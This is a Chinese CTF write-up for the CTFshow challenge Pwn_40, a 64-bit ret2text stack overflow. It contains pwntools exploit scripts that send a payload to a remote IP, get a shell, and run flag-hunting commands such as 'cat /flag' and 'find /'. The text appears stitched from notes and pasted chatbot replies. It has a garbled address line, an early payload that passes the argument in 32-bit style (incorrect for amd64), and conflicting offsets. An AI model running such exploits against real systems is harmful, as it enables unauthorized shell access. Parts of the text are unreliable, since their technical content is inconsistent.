---
title: "Pwn_40"
date: 2026-03-15 13:28:16
categories:
- Capture_The_Flag_夺旗赛
- 夺旗赛Write-up
- CTFshow
---

题目：64位的 system(); "/bin/sh"

![](1760618725040-59e3a325-8935-421a-958e-cd65f335efb9.png)

### `Arch: amd64-64-little`
+ 说明程序的架构是 **64 位的小端（Little-endian）x86-64** 架构。小端是指数据的低位字节存储在内存的低地址处，这是 x86 系列处理器常用的字节序。在 64 位程序中，寄存器是 64 位的（如 `RDI`、`RSI` 等），函数调用的参数传递、栈操作等都遵循 64 位的规则。

### `RELRO: Partial RELRO`
+ `RELRO`（Relocation Read-Only）是一种保护机制，用于防止 **延迟绑定攻击**。
    - `Partial RELRO` 表示只有部分重定位表（如 `.got` 段）被设置为只读，而 `.got.plt` 段仍可写。这意味着攻击者仍有一定机会利用重定位相关的漏洞，但防护比 `No RELRO` 强。

### `Stack: No canary found`
+ 表示程序 **没有开启****<u>栈金丝雀（Stack Canary）保护</u>**。栈金丝雀是一种用于检测栈溢出的机制，在函数调用时会在栈上特定位置放置一个随机值（“金丝雀”），函数返回前检查该值是否被篡改。没有此保护的话，攻击者可以更轻易地进行栈溢出攻击，覆盖返回地址等关键数据。

### `NX: NX enabled`
+ `NX`（No-eXecute，不可执行）保护已开启。这意味着内存的某些区域（通常是栈、堆等数据区域）被标记为不可执行，即使攻击者向这些区域注入了可执行代码，程序也无法执行这些代码。这限制了诸如注入 shellcode 这类攻击方式，但可以通过 `ret2text`（返回程序自身代码段中的有用指令）等方式绕过。

### `PIE: No PIE (0x400000)`
+ `PIE`（Position-Independent Executable，地址无关可执行文件）未开启。程序加载时的基地址是固定的（这里显示为 `0x400000`）。这对漏洞利用很有利，因为程序中函数、字符串等的地址是固定的，攻击者可以直接使用这些固定地址来构造攻击载荷，而无需动态计算地址偏移。

### `Stripped: No`
+ 表示程序 **没有被剥离（Stripped）符号表**。符号表中包含了函数名、变量名等调试信息。没有被剥离符号表的话，攻击者可以很方便地通过工具（如 `objdump`、`gdb` 等）查看程序中的函数、变量等信息，有助于分析程序结构和寻找漏洞利用点。![](1760660400019-4c8a1334-8afa-4a53-a17f-b5b491e2a8ce.png)
1. **信息收集**

首先通过`nc 152.32.191.198 33784`连接目标服务，观察输入输出模式（如是否有固定提示、输入长度限制等），判断溢出点可能存在的位置。

#### 确定溢出偏移量
通过 cyclic 模式计算缓冲区到返回地址的偏移：

```python
from pwn import *

# 生成 cyclic 字符串（长度根据实际情况调整）
payload = cyclic(200)
p = remote("152.32.191.198", 33784)
p.sendline(payload)
p.interactive()
```

![](1760582863377-e25febc4-027c-47d1-a2fa-0b84cd9b7d26.png)程序崩溃后，通过调试获取崩溃时的`rip`值（如`0x6161616161616168`），再用`cyclic_find(0x6161616161616168)`计算偏移量`offset`。

#### 2. 查找关键地址
若程序中已存在`system`函数和`"/bin/sh"`字符串（ret2text 的核心前提）：

+ 本地调试时，用`objdump -d 程序名 | grep system`获取`system`函数地址（如`0x400560`）。
+ 用`ROPgadget --binary 程序名 --string "/bin/sh"`获取字符串地址（如`0x601048`）。

若目标为远程服务无法直接获取，可尝试：

+ 若服务基于 libc，通过泄露 libc 基地址计算`system`和`"/bin/sh"`地址（需额外的信息泄露漏洞）。
+ 若程序静态编译，直接在本地同版本程序中查找地址。

#### 3. 构造 payload
64 位程序中，函数参数前 6 个通过寄存器传递，但`system`仅需一个参数，构造格式如下：

**python**

运行

```python
from pwn import *

offset = 120  # 实际计算的偏移量
system_addr = 0x400560  # 实际的system地址
binsh_addr = 0x601048   # 实际的"/bin/sh"地址

# 构造payload：填充缓冲区 + 返回至system + 垃圾数据（system返回地址） + 参数地址
payload = b"A" * offset
payload += p64(system_addr)  # 覆盖返回地址为system
payload += p64(0xdeadbeef)   # 占位：system执行后的返回地址（可任意值）
payload += p64(binsh_addr)   # system的参数："/bin/sh"

# 发送payload
p = remote("152.32.191.198", 33784)
p.sendline(payload)
p.interactive()  # 获取shell
```

### 三、可能遇到的问题及解决
1. **地址错误**若执行后未获得 shell，可能是`system`或`"/bin/sh"`地址错误，需重新确认（可通过调试或泄露 libc 解决）。
2. **栈对齐问题**64 位程序可能要求栈对齐，若失败，可在`system`地址前添加`ret` gadget（如`0x400501`）调整栈：**python**运行

```python
ret_gadget = 0x400501  # 通过ROPgadget查找的ret地址
payload = b"A" * offset + p64(ret_gadget) + p64(system_addr) + p64(0) + p64(binsh_addr)
```

3. **无**`**system**`**或**`**"/bin/sh"**`若程序中没有这两个元素，需改用`ret2libc`技术：先泄露 libc 基地址，再计算对应地址。







```plain
# 仅用于生成 200 字节的 cyclic 模式字符串（修复字节/字符串类型问题）
from pwn import *

# 生成 200 字节的 cyclic 规律性字符串（bytes类型）
cyclic_bytes = cyclic(200)
# 打印字节串的原始内容（方便复制用于程序输入）
print("生成的 cyclic 字节串：")
print(cyclic_bytes)

# 方法1：直接将字节串写入文件（以二进制模式打开）
with open("cyclic.txt", "wb") as f:
    f.write(cyclic_bytes)
print("\n字节串已保存到 cyclic.txt 文件中（二进制模式）")

# 可选方法2：将字节串解码为字符串后写入（需确保无特殊字符报错）
try:
    cyclic_str = cyclic_bytes.decode('ascii')
    with open("cyclic_str.txt", "w") as f:
        f.write(cyclic_str)
    print("字符串已保存到 cyclic_str.txt 文件中（ASCII解码模式）")
except UnicodeDecodeError:
    print("提示：部分字符无法ASCII解码，推荐使用二进制模式的 cyclic.txt 文件")
```

C:\Users\glj07\AppData\Local\Programs\Python\Python313\python.exe "D:\Capture The Flag\exp.py" 

生成的 cyclic 字节串：

b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'



字节串已保存到 cyclic.txt 文件中（二进制模式）

字符串已保存到 cyclic_str.txt 文件中（ASCII解码模式）



进程已结束，退出代码为 0

完美！cyclic 字符串已经成功生成，接下来就进入核心的偏移量计算环节，具体操作步骤如下：

### 一、获取崩溃时的`rip`值
1. **本地调试场景**
    - 打开终端，用 GDB 启动目标程序：`gdb ./目标程序名`。
    - 在 GDB 中输入`run`运行程序，当程序等待输入时，粘贴之前生成的 cyclic 字符串（终端输出的字节串或从`cyclic_str.txt`复制）。
    - 程序崩溃后，输入`info registers rip`命令，记录下输出的十六进制`rip`值（例如`0x616161616161616c`）。
2. **远程服务场景**
    - 若无法本地复现，需确保远程程序与本地样本完全一致，直接在本地调试样本获取`rip`值即可（偏移量通常通用）。
    - 若远程连接发送 cyclic 字符串后崩溃，可通过日志或调试工具（如 pwntools 的`gdb.attach`）获取`rip`值。

### 二、计算偏移量`offset`
将获取到的`rip`值代入以下代码，运行后直接得到偏移量：

**python**

运行

```python
from pwn import *

# 替换为你实际获取的 rip 十六进制值
rip_value = 0x616161616161616c  # 示例值，务必修改！
offset = cyclic_find(rip_value)
print(f"最终计算的溢出偏移量：{offset}")
```

### 三、后续操作
拿到`offset`后，结合之前教你的方法查找`system`地址、`/bin/sh`地址、`ret`和`pop rdi; ret` gadget，就能填充到之前的完整 exp 脚本中，执行即可尝试获取 shell。













![](1760663762309-5f42e0fa-9947-4f28-8081-05320b19d7d0.png)

 /bin/sh 字符串的地址：0x40080864 位程序与 32 位程序传参规则的不同：



在 32 位汇编中，参数是直接放在堆栈上的，而不是放在寄存器上。



但是对于 64 位汇编，当参数少于等于 6 个时，参数从左到右依次放入寄存器：rdi、rsi、rdx、rcx、r8、r9。当参数为 7 个以上时，前 6 个参数仍然按照上述规则放入寄存器，但是第 7 个及以后的参数从右向左依次放入栈中。也就是说要先把六个寄存器放满了才会考虑放入栈。



有的题，里面既没有现成的 system 函数，也没有 /bin/sh 字符串，也没有提供 libc.so 给我们，那么我们要做的就是想办法泄露 libc 地址，拿到 system 函数和 /bin/sh 字符串，我们就需要获取 rdi, rsi, rdx, rcx, r8, r9 它们的地址，首先要获取的是 rdi 的地址。



rdi 的地址我们使用工具 ROPgadget 来获取：



ROPgadget --binary pwn --only "pop|ret" | grep rdi

————————————————

参数解释：

--binary pwn: 指定了要分析的二进制文件的文件名。

--only "pop|ret": 指定了只查找包含"pop"和"ret"指令序列的代码片段，这些指令通常用于弹出寄存器中的值，并将控制流返回到调用函数的地址处，是ROP攻击中常用的gadgets。

| grep rdi: 将ROPgadget的输出传递给grep命令，然后使用grep命令筛选出包含"rdi"寄存器的代码片段，这样就可以只找到包含"pop|ret"指令序列并且弹出rdi寄存器的gadgets。



gadgets 指的是程序中的一些短小的代码片段，这些代码片段通常以一种特定的指令序列结尾，比如"ret"指令。（就是以 ret 结尾的指令序列）

┌──(kali㉿kali)-[~]

└─$ ROPgadget --binary pwn40 --only "pop|ret" | grep rdi

0x00000000004007e3 : pop rdi ; ret

```plain
from pwn import *

# 环境配置：64位架构，debug日志便于观察
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

# 连接目标地址（你的端口152.32.191.198:33812）
p = remote('152.32.191.198', 33812)

# 构造payload（原逻辑正确，无需修改）
payload = b'a' * 0x12  # 填充到返回地址（偏移0x12）
payload += p64(0x4007e3)  # pop rdi ; ret（传参gadget）
payload += p64(0x400808)  # "/bin/sh" 字符串地址
payload += p64(0x4004fe)  # ret（栈对齐，64位必需）
payload += p64(0x400520)  # system 函数地址

# 发送payload并进入交互
p.sendline(payload)

# 自动尝试常见flag路径（避免手动输入，覆盖多数情况）
common_flag_paths = [
    'cat flag',          # 最常见：当前目录flag
    'cat /flag',         # 根目录flag
    'cat ./flag.txt',    # 当前目录flag.txt
    'cat /flag.txt',     # 根目录flag.txt
    'ls -l && echo "===LIST DONE==="',  # 先列目录，确认文件存在
    'find / -name "*flag*" 2>/dev/null' # 搜索所有含flag的文件（慢但有效）
]

# 依次执行命令
for cmd in common_flag_paths:
    p.sendline(cmd.encode())
    sleep(0.5)  # 等待命令执行结果返回

# 最后保留手动交互，方便后续操作
p.interactive()
```






